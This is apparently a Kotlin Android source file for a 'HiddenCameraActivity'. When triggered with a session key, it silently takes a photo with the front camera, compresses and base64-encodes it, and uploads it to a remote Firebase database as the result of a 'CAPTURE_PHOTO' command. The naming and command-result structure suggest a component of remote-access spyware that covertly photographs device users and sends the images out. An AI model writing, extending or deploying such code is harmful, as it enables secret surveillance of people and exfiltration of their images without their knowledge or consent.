package com.jonas.x24

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import com.google.firebase.database.FirebaseDatabase
import java.nio.ByteBuffer

class HiddenCameraActivity : Activity() {

    private var cameraDevice: CameraDevice? = null
    private var imageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null
    private var sessionKey: String? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        sessionKey = intent.getStringExtra("SESSION_KEY")
        if (sessionKey == null) {
            finish()
            return
        }

        startBackgroundThread()

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            takePicture()
        } else {
            postResult("ERROR", "Camera permission denied.", "CAPTURE_PHOTO")
            finish()
        }
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread!!.looper)
    }

    private fun stopBackgroundThread() {
        backgroundThread?.quitSafely()
        try {
            backgroundThread?.join()
            backgroundThread = null
            backgroundHandler = null
        } catch (e: InterruptedException) {
            e.printStackTrace()
        }
    }

    private fun takePicture() {
        val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = manager.cameraIdList.firstOrNull { id ->
                manager.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
            } ?: manager.cameraIdList.firstOrNull()

            if (cameraId == null) {
                postResult("ERROR", "No camera found.", "CAPTURE_PHOTO")
                finish()
                return
            }

            val characteristics = manager.getCameraCharacteristics(cameraId)
            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val size = map?.getOutputSizes(ImageFormat.JPEG)?.firstOrNull() ?: android.util.Size(640, 480)

            imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1).apply {
                setOnImageAvailableListener({ reader ->
                    var image: Image? = null
                    try {
                        image = reader.acquireLatestImage()
                        val buffer: ByteBuffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.capacity())
                        buffer.get(bytes)

                    // Downscale and compress to ensure it fits in Firebase limits
                    val options = android.graphics.BitmapFactory.Options()
                    options.inJustDecodeBounds = true
                    android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size, options)

                    val maxDim = 800
                    var scale = 1
                    if (options.outHeight > maxDim || options.outWidth > maxDim) {
                        scale = Math.pow(2.0, Math.ceil(Math.log(Math.max(options.outHeight, options.outWidth).toDouble() / maxDim) / Math.log(0.5)).toInt() * -1.0).toInt()
                    }

                    options.inJustDecodeBounds = false
                    options.inSampleSize = scale
                    val bitmap = android.graphics.BitmapFactory.decodeByteArray(bytes, 0, bytes.size, options)

                    if (bitmap != null) {
                        val outputStream = java.io.ByteArrayOutputStream()
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, outputStream)
                        val compressedBytes = outputStream.toByteArray()
                        val base64 = Base64.encodeToString(compressedBytes, Base64.NO_WRAP)
                        postResult("IMAGE", base64, "CAPTURE_PHOTO")
                    } else {
                        postResult("ERROR", "Failed to decode captured image.", "CAPTURE_PHOTO")
                    }
                    } catch (e: Exception) {
                        postResult("ERROR", "Failed to process image: ${e.message}", "CAPTURE_PHOTO")
                    } finally {
                        image?.close()
                        finish()
                    }
                }, backgroundHandler)
            }

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return
            }

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                    postResult("ERROR", "Camera error: $error", "CAPTURE_PHOTO")
                    finish()
                }
            }, backgroundHandler)
        } catch (e: CameraAccessException) {
            e.printStackTrace()
            postResult("ERROR", "Camera access exception: ${e.message}", "CAPTURE_PHOTO")
            finish()
        }
    }

    private fun createCaptureSession() {
        try {
            val surface = imageReader?.surface ?: return
            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder?.addTarget(surface)

            cameraDevice?.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    if (cameraDevice == null) return
                    try {
                        session.capture(captureBuilder!!.build(), null, backgroundHandler)
                    } catch (e: CameraAccessException) {
                        postResult("ERROR", "Capture failed: ${e.message}", "CAPTURE_PHOTO")
                        finish()
                    }
                }

                override fun onConfigureFailed(session: CameraCaptureSession) {
                    postResult("ERROR", "Capture session configuration failed.", "CAPTURE_PHOTO")
                    finish()
                }
            }, backgroundHandler)
        } catch (e: CameraAccessException) {
            e.printStackTrace()
        }
    }

    private fun postResult(type: String, data: String, command: String = "") {
        val currentSessionKey = sessionKey ?: return
        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("results").push()
        val payload = mapOf(
            "type" to type,
            "data" to data,
            "command" to command,
            "timestamp" to System.currentTimeMillis()
        )
        ref.setValue(payload)
    }

    override fun onDestroy() {
        super.onDestroy()
        cameraDevice?.close()
        imageReader?.close()
        stopBackgroundThread()
    }
}